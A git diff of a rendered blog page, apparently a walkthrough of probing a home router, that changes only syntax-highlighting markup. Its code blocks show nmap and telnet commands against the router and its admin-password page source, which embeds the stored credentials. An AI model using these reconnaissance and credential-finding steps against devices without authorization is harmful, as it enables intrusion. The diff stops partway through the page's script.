@@ -111,8 +111,8 @@ use <code>sudo</code> to make nmap go faster.</p>
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">sudo nmap -sC -sV -oA router.txt 192.168.1.1
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo nmap -sC -sV -oA router.txt 192.168.1.1
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>While we check for the result it&rsquo;s a good idea to run another scan of all ports.</p>
 <div class="highlight"><div class="chroma">
@@ -120,8 +120,8 @@ use <code>sudo</code> to make nmap go faster.</p>
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">sudo nmap -sC -sV -p- -oA router_allports.txt 192.168.1.1
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo nmap -sC -sV -p- -oA router_allports.txt 192.168.1.1
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Let&rsquo;s inspect the output of the first command.</p>
 <h2 id="results">Results</h2>
@@ -159,8 +159,8 @@ login.</p>
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">telnet 192.168.1.1 <span class="m">23</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">telnet 192.168.1.1 <span class="m">23</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><figure><img src="./pic/2021-01-04_20-08.png"/><figcaption>
             <h4>telnet</h4>
@@ -326,142 +326,142 @@ contains the <code>passwd</code> word in it and I found two.</p>
 </span><span class="lnt">135
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
-<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
-        <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">HTTP-EQUIV</span><span class="o">=</span><span class="s">&#39;Pragma&#39;</span> <span class="na">CONTENT</span><span class="o">=</span><span class="s">&#39;no-cache&#39;</span><span class="p">&gt;</span>
-        <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">http-equiv</span><span class="o">=</span><span class="s">&#34;Content-Type&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;text/html; charset=iso-8859-1&#34;</span> <span class="p">/&gt;</span>
-        <span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;stylesheet&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#39;stylemain.css&#39;</span> <span class="na">type</span><span class="o">=</span><span class="s">&#39;text/css&#39;</span><span class="p">&gt;</span>
-        <span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;stylesheet&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#39;colors.css&#39;</span> <span class="na">type</span><span class="o">=</span><span class="s">&#39;text/css&#39;</span><span class="p">&gt;</span>
-        <span class="p">&lt;</span><span class="nt">script</span> <span class="na">language</span><span class="o">=</span><span class="s">&#34;javascript&#34;</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;util.js&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
-        <span class="p">&lt;</span><span class="nt">script</span> <span class="na">language</span><span class="o">=</span><span class="s">&#34;javascript&#34;</span> <span class="p">&gt;</span>
-<span class="c">&lt;!--</span> <span class="nx">hide</span>
-
-<span class="nx">nameAdmin</span> <span class="o">=</span> <span class="s1">&#39;&lt;%ejGet(sysUserName)%&gt;&#39;</span><span class="p">;</span>
-<span class="nx">pwdAdmin</span> <span class="o">=</span> <span class="s1">&#39;&lt;%ejGet(sysPassword)%&gt;&#39;</span><span class="p">;</span>
-
-<span class="kd">function</span> <span class="nx">frmLoad</span><span class="p">()</span>
-<span class="p">{</span>
-    <span class="kd">with</span> <span class="p">(</span> <span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="p">)</span>
-    <span class="p">{</span>
-        <span class="nx">sysUserName</span><span class="p">.</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">nameAdmin</span><span class="p">;</span>
-        <span class="nx">sysPassword</span><span class="p">.</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">pwdAdmin</span><span class="p">;</span>
-        <span class="nx">cfmPwd</span><span class="p">.</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">pwdAdmin</span><span class="p">;</span>
-    <span class="p">}</span>
-<span class="p">}</span>
-
-<span class="kd">function</span> <span class="nx">btnApplyAdmin</span><span class="p">()</span>
-<span class="p">{</span>
-    <span class="kd">var</span> <span class="nx">loc</span> <span class="o">=</span> <span class="s1">&#39;adminpasswd.cgi?action=save&amp;&#39;</span><span class="p">;</span>
-    <span class="kd">with</span> <span class="p">(</span> <span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="p">)</span>
-    <span class="p">{</span>
-        <span class="k">if</span><span class="p">(</span><span class="nx">sysUserName</span><span class="p">.</span><span class="nx">value</span> <span class="o">==</span>  <span class="s1">&#39;&lt;%ejGet(usrUserName)%&gt;&#39;</span><span class="p">)</span>
-        <span class="p">{</span>
-            <span class="nx">alert</span><span class="p">(</span><span class="s2">&#34;Don&#39;t make such names!Please change it!\n &#34;</span><span class="p">);</span>
-            <span class="k">return</span><span class="p">;</span>
-        <span class="p">}</span>
-                
-                        <span class="k">if</span> <span class="p">(</span> <span class="nx">isIncludeInvalidChar</span><span class="p">(</span><span class="nx">sysUserName</span><span class="p">.</span><span class="nx">value</span><span class="p">)</span> <span class="p">)</span> 
-                <span class="p">{</span>
-                 <span class="nx">alert</span><span class="p">(</span><span class="s1">&#39;Invalide characters in user name.&#39;</span><span class="p">);</span>
-                 <span class="k">return</span><span class="p">;</span>
-            <span class="p">}</span>
-
-                <span class="k">if</span> <span class="p">(</span> <span class="nx">isIncludeInvalidChar</span><span class="p">(</span><span class="nx">sysPassword</span><span class="p">.</span><span class="nx">value</span><span class="p">)</span> <span class="p">)</span> 
-                <span class="p">{</span>
-                 <span class="nx">alert</span><span class="p">(</span><span class="s1">&#39;Invalide characters in password.&#39;</span><span class="p">);</span>
-                 <span class="k">return</span><span class="p">;</span>
-            <span class="p">}</span>
-
-        <span class="k">if</span> <span class="p">(</span> <span class="nx">sysUserName</span><span class="p">.</span><span class="nx">value</span><span class="p">.</span><span class="nx">length</span> <span class="o">==</span> <span class="mi">0</span> <span class="p">)</span> 
-        <span class="p">{</span>
-             <span class="nx">alert</span><span class="p">(</span><span class="s1">&#39;Admin Account and Password can\&#39;t be empty.&#39;</span><span class="p">);</span>
-             <span class="k">return</span><span class="p">;</span>
-        <span class="p">}</span>        
-        <span class="k">if</span> <span class="p">(</span> <span class="nx">sysUserName</span><span class="p">.</span><span class="nx">value</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span> <span class="p">)</span> 
-        <span class="p">{</span>
-             <span class="nx">alert</span><span class="p">(</span><span class="s1">&#39;Admin Accout can\&#39;t contain a space.&#39;</span><span class="p">);</span>
-             <span class="k">return</span><span class="p">;</span>
-        <span class="p">}</span>
-        <span class="k">if</span> <span class="p">(</span> <span class="nx">sysPassword</span><span class="p">.</span><span class="nx">value</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span> <span class="p">)</span> 
-        <span class="p">{</span>
-            <span class="nx">alert</span><span class="p">(</span><span class="s1">&#39;Password can\&#39;t contain a space.&#39;</span><span class="p">);</span>
-            <span class="k">return</span><span class="p">;</span>
-        <span class="p">}</span>
-        <span class="k">if</span> <span class="p">(</span> <span class="nx">sysUserName</span><span class="p">.</span><span class="nx">value</span><span class="p">.</span><span class="nx">length</span> <span class="o">&gt;</span> <span class="mi">15</span> <span class="p">)</span>
-        <span class="p">{</span>
-            <span class="nx">alert</span><span class="p">(</span> <span class="s1">&#39;Admin  Account  should not be longer the 15 characters!&#39;</span> <span class="p">);</span>
-            <span class="k">return</span><span class="p">;</span>
-        <span class="p">}</span>
-        <span class="k">if</span> <span class="p">(</span> <span class="nx">sysPassword</span><span class="p">.</span><span class="nx">value</span><span class="p">.</span><span class="nx">length</span> <span class="o">&gt;</span> <span class="mi">32</span> <span class="p">)</span>
-        <span class="p">{</span>
-            <span class="nx">alert</span> <span class="p">(</span><span class="s1">&#39;Password should not be longer than 32 characters.&#39;</span><span class="p">);</span>
-            <span class="k">return</span><span class="p">;</span>
-        <span class="p">}</span>
-        <span class="k">if</span> <span class="p">(</span> <span class="nx">sysPassword</span><span class="p">.</span><span class="nx">value</span> <span class="o">!=</span> <span class="nx">cfmPwd</span><span class="p">.</span><span class="nx">value</span> <span class="p">)</span>
-        <span class="p">{</span>
-            <span class="nx">alert</span><span class="p">(</span><span class="s2">&#34;The passwords do not match.&#34;</span><span class="p">);</span>
-            <span class="k">return</span><span class="p">;</span>
-        <span class="p">}</span>
-        <span class="k">if</span> <span class="p">(</span> <span class="nx">sysPassword</span><span class="p">.</span><span class="nx">value</span><span class="p">.</span><span class="nx">length</span> <span class="o">==</span> <span class="mi">0</span> <span class="p">)</span> 
-        <span class="p">{</span>
-             <span class="nx">alert</span><span class="p">(</span><span class="s1">&#39;Admin Accout and Password cannot be empty.&#39;</span><span class="p">);</span>
-             <span class="k">return</span><span class="p">;</span>
-        <span class="p">}</span>
-        <span class="nx">loc</span> <span class="o">+=</span> <span class="s1">&#39;sysUserName=&#39;</span> <span class="o">+</span> <span class="nx">encodeUrl</span><span class="p">(</span><span class="nx">sysUserName</span><span class="p">.</span><span class="nx">value</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;&amp;&#39;</span><span class="p">;</span>
-        <span class="nx">loc</span> <span class="o">+=</span> <span class="s1">&#39;sysPassword=&#39;</span> <span class="o">+</span> <span class="nx">encryptPassword</span><span class="p">(</span><span class="nx">encodeUrl</span><span class="p">(</span><span class="nx">sysPassword</span><span class="p">.</span><span class="nx">value</span><span class="p">));</span> <span class="c1">//lvwz
-</span><span class="c1"></span>        
-        <span class="kd">var</span> <span class="nx">code</span> <span class="o">=</span> <span class="s1">&#39;location.assign(&#34;&#39;</span> <span class="o">+</span> <span class="nx">loc</span> <span class="o">+</span> <span class="s1">&#39;&#34;)&#39;</span><span class="p">;</span>
-        <span class="nb">eval</span><span class="p">(</span><span class="nx">code</span><span class="p">);</span>
-        
-    <span class="p">}</span>
-<span class="p">}</span>
-
-
-<span class="o">--&gt;</span>
-        <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
-<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
-
-<span class="p">&lt;</span><span class="nt">body</span> <span class="na">onLoad</span><span class="o">=</span><span class="s">&#39;frmLoad()&#39;</span><span class="p">&gt;</span>
-<span class="p">&lt;</span><span class="nt">form</span><span class="p">&gt;</span>
-<span class="p">&lt;</span><span class="nt">strong</span><span class="p">&gt;</span>Admin Account<span class="p">&lt;/</span><span class="nt">strong</span><span class="p">&gt;</span> <span class="p">&lt;</span><span class="nt">BR</span><span class="p">&gt;</span>
-<span class="p">&lt;</span><span class="nt">BR</span><span class="p">&gt;</span>
-<span class="p">&lt;</span><span class="nt">TABLE</span> <span class="na">cellSpacing</span><span class="o">=</span><span class="s">&#34;0&#34;</span> <span class="na">cellPadding</span><span class="o">=</span><span class="s">&#34;0&#34;</span> <span class="na">border</span><span class="o">=</span><span class="s">&#34;0&#34;</span><span class="p">&gt;</span>
-  <span class="p">&lt;</span><span class="nt">TBODY</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">TR</span><span class="p">&gt;</span>
-      <span class="p">&lt;</span><span class="nt">TD</span> <span class="na">width</span><span class="o">=</span><span class="s">&#34;590&#34;</span><span class="p">&gt;</span>Admin account has unrestricted access to change and view configuration of your ADSL<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span> router. <span class="p">&lt;/</span><span class="nt">TD</span><span class="p">&gt;</span>
-    <span class="p">&lt;/</span><span class="nt">TR</span><span class="p">&gt;</span>
-  <span class="p">&lt;/</span><span class="nt">TBODY</span><span class="p">&gt;</span>
-<span class="p">&lt;/</span><span class="nt">TABLE</span><span class="p">&gt;</span>
-<span class="p">&lt;</span><span class="nt">BR</span><span class="p">&gt;</span>
-<span class="p">&lt;</span><span class="nt">TABLE</span> <span class="na">cellSpacing</span><span class="o">=</span><span class="s">&#34;0&#34;</span> <span class="na">cellPadding</span><span class="o">=</span><span class="s">&#34;0&#34;</span> <span class="na">border</span><span class="o">=</span><span class="s">&#34;0&#34;</span><span class="p">&gt;</span>
-  <span class="p">&lt;</span><span class="nt">TBODY</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">TR</span> <span class="na">height</span><span class="o">=</span><span class="s">&#34;30&#34;</span><span class="p">&gt;</span>
-      <span class="p">&lt;</span><span class="nt">TD</span> <span class="na">width</span><span class="o">=</span><span class="s">&#34;150&#34;</span><span class="p">&gt;</span>User Name:<span class="p">&lt;/</span><span class="nt">TD</span><span class="p">&gt;</span>
-      <span class="p">&lt;</span><span class="nt">TD</span><span class="p">&gt;&lt;</span><span class="nt">INPUT</span> <span class="na">maxLength</span><span class="o">=</span><span class="s">&#34;63&#34;</span>  <span class="na">size</span><span class="o">=</span><span class="s">&#34;30&#34;</span>   <span class="na">name</span><span class="o">=</span><span class="s">&#34;sysUserName&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">TD</span><span class="p">&gt;</span>
-    <span class="p">&lt;/</span><span class="nt">TR</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">TR</span> <span class="na">height</span><span class="o">=</span><span class="s">&#34;30&#34;</span><span class="p">&gt;</span>
-      <span class="p">&lt;</span><span class="nt">TD</span><span class="p">&gt;</span>New Password:<span class="p">&lt;/</span><span class="nt">TD</span><span class="p">&gt;</span>
-      <span class="p">&lt;</span><span class="nt">TD</span><span class="p">&gt;&lt;</span><span class="nt">INPUT</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;password&#34;</span> <span class="na">maxLength</span><span class="o">=</span><span class="s">&#34;32&#34;</span> <span class="na">size</span><span class="o">=</span><span class="s">&#34;30&#34;</span>  <span class="na">name</span><span class="o">=</span><span class="s">&#34;sysPassword&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">TD</span><span class="p">&gt;</span>
-    <span class="p">&lt;/</span><span class="nt">TR</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">TR</span> <span class="na">height</span><span class="o">=</span><span class="s">&#34;30&#34;</span><span class="p">&gt;</span>
-      <span class="p">&lt;</span><span class="nt">TD</span><span class="p">&gt;</span>Confirm New Password:<span class="p">&lt;/</span><span class="nt">TD</span><span class="p">&gt;</span>
-      <span class="p">&lt;</span><span class="nt">TD</span><span class="p">&gt;&lt;</span><span class="nt">INPUT</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;password&#34;</span> <span class="na">maxLength</span><span class="o">=</span><span class="s">&#34;32&#34;</span> <span class="na">size</span><span class="o">=</span><span class="s">&#34;30&#34;</span>  <span class="na">name</span><span class="o">=</span><span class="s">&#34;cfmPwd&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">TD</span><span class="p">&gt;</span>
-    <span class="p">&lt;/</span><span class="nt">TR</span><span class="p">&gt;</span>
-  <span class="p">&lt;/</span><span class="nt">TBODY</span><span class="p">&gt;</span>
-<span class="p">&lt;/</span><span class="nt">TABLE</span><span class="p">&gt;</span>
-<span class="p">&lt;</span><span class="nt">BR</span><span class="p">&gt;</span>
-<span class="p">&lt;</span><span class="nt">TABLE</span> <span class="na">width</span><span class="o">=</span><span class="s">&#34;500&#34;</span> <span class="na">border</span><span class="o">=</span><span class="s">&#34;0&#34;</span><span class="p">&gt;</span>
-  <span class="p">&lt;</span><span class="nt">TBODY</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">TR</span><span class="p">&gt;</span>
-      <span class="p">&lt;</span><span class="nt">TD</span> <span class="na">align</span><span class="o">=</span><span class="s">&#34;left&#34;</span> <span class="na">width</span><span class="o">=</span><span class="s">&#34;494&#34;</span><span class="p">&gt;&lt;</span><span class="nt">INPUT</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;button&#34;</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;button&#34;</span> <span class="na">onClick</span><span class="o">=</span><span class="s">&#34;btnApplyAdmin()&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;Apply&#34;</span><span class="p">&gt;</span>
-      <span class="p">&lt;/</span><span class="nt">TD</span><span class="p">&gt;</span>
-    <span class="p">&lt;/</span><span class="nt">TR</span><span class="p">&gt;</span>
-  <span class="p">&lt;/</span><span class="nt">TBODY</span><span class="p">&gt;</span>
-<span class="p">&lt;/</span><span class="nt">TABLE</span><span class="p">&gt;</span>
-<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
-<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
-<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">HTTP-EQUIV</span><span class="o">=</span><span class="s">&#39;Pragma&#39;</span> <span class="na">CONTENT</span><span class="o">=</span><span class="s">&#39;no-cache&#39;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">http-equiv</span><span class="o">=</span><span class="s">&#34;Content-Type&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;text/html; charset=iso-8859-1&#34;</span> <span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;stylesheet&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#39;stylemain.css&#39;</span> <span class="na">type</span><span class="o">=</span><span class="s">&#39;text/css&#39;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;stylesheet&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#39;colors.css&#39;</span> <span class="na">type</span><span class="o">=</span><span class="s">&#39;text/css&#39;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">script</span> <span class="na">language</span><span class="o">=</span><span class="s">&#34;javascript&#34;</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;util.js&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">script</span> <span class="na">language</span><span class="o">=</span><span class="s">&#34;javascript&#34;</span> <span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="c">&lt;!--</span> <span class="nx">hide</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">nameAdmin</span> <span class="o">=</span> <span class="s1">&#39;&lt;%ejGet(sysUserName)%&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">pwdAdmin</span> <span class="o">=</span> <span class="s1">&#39;&lt;%ejGet(sysPassword)%&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">frmLoad</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">with</span> <span class="p">(</span> <span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">sysUserName</span><span class="p">.</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">nameAdmin</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">sysPassword</span><span class="p">.</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">pwdAdmin</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">cfmPwd</span><span class="p">.</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">pwdAdmin</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">btnApplyAdmin</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">loc</span> <span class="o">=</span> <span class="s1">&#39;adminpasswd.cgi?action=save&amp;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">with</span> <span class="p">(</span> <span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">sysUserName</span><span class="p">.</span><span class="nx">value</span> <span class="o">==</span>  <span class="s1">&#39;&lt;%ejGet(usrUserName)%&gt;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">alert</span><span class="p">(</span><span class="s2">&#34;Don&#39;t make such names!Please change it!\n &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">                
+</span></span><span class="line"><span class="cl">                        <span class="k">if</span> <span class="p">(</span> <span class="nx">isIncludeInvalidChar</span><span class="p">(</span><span class="nx">sysUserName</span><span class="p">.</span><span class="nx">value</span><span class="p">)</span> <span class="p">)</span> 
+</span></span><span class="line"><span class="cl">                <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                 <span class="nx">alert</span><span class="p">(</span><span class="s1">&#39;Invalide characters in user name.&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                 <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span> <span class="nx">isIncludeInvalidChar</span><span class="p">(</span><span class="nx">sysPassword</span><span class="p">.</span><span class="nx">value</span><span class="p">)</span> <span class="p">)</span> 
+</span></span><span class="line"><span class="cl">                <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                 <span class="nx">alert</span><span class="p">(</span><span class="s1">&#39;Invalide characters in password.&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                 <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="nx">sysUserName</span><span class="p">.</span><span class="nx">value</span><span class="p">.</span><span class="nx">length</span> <span class="o">==</span> <span class="mi">0</span> <span class="p">)</span> 
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">             <span class="nx">alert</span><span class="p">(</span><span class="s1">&#39;Admin Account and Password can\&#39;t be empty.&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">             <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>        
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="nx">sysUserName</span><span class="p">.</span><span class="nx">value</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span> <span class="p">)</span> 
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">             <span class="nx">alert</span><span class="p">(</span><span class="s1">&#39;Admin Accout can\&#39;t contain a space.&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">             <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="nx">sysPassword</span><span class="p">.</span><span class="nx">value</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span> <span class="p">)</span> 
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">alert</span><span class="p">(</span><span class="s1">&#39;Password can\&#39;t contain a space.&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="nx">sysUserName</span><span class="p">.</span><span class="nx">value</span><span class="p">.</span><span class="nx">length</span> <span class="o">&gt;</span> <span class="mi">15</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">alert</span><span class="p">(</span> <span class="s1">&#39;Admin  Account  should not be longer the 15 characters!&#39;</span> <span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="nx">sysPassword</span><span class="p">.</span><span class="nx">value</span><span class="p">.</span><span class="nx">length</span> <span class="o">&gt;</span> <span class="mi">32</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">alert</span> <span class="p">(</span><span class="s1">&#39;Password should not be longer than 32 characters.&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="nx">sysPassword</span><span class="p">.</span><span class="nx">value</span> <span class="o">!=</span> <span class="nx">cfmPwd</span><span class="p">.</span><span class="nx">value</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">alert</span><span class="p">(</span><span class="s2">&#34;The passwords do not match.&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="nx">sysPassword</span><span class="p">.</span><span class="nx">value</span><span class="p">.</span><span class="nx">length</span> <span class="o">==</span> <span class="mi">0</span> <span class="p">)</span> 
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">             <span class="nx">alert</span><span class="p">(</span><span class="s1">&#39;Admin Accout and Password cannot be empty.&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">             <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">loc</span> <span class="o">+=</span> <span class="s1">&#39;sysUserName=&#39;</span> <span class="o">+</span> <span class="nx">encodeUrl</span><span class="p">(</span><span class="nx">sysUserName</span><span class="p">.</span><span class="nx">value</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;&amp;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">loc</span> <span class="o">+=</span> <span class="s1">&#39;sysPassword=&#39;</span> <span class="o">+</span> <span class="nx">encryptPassword</span><span class="p">(</span><span class="nx">encodeUrl</span><span class="p">(</span><span class="nx">sysPassword</span><span class="p">.</span><span class="nx">value</span><span class="p">));</span> <span class="c1">//lvwz
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        
+</span></span><span class="line"><span class="cl">        <span class="kd">var</span> <span class="nx">code</span> <span class="o">=</span> <span class="s1">&#39;location.assign(&#34;&#39;</span> <span class="o">+</span> <span class="nx">loc</span> <span class="o">+</span> <span class="s1">&#39;&#34;)&#39;</span><span class="p">;</span>
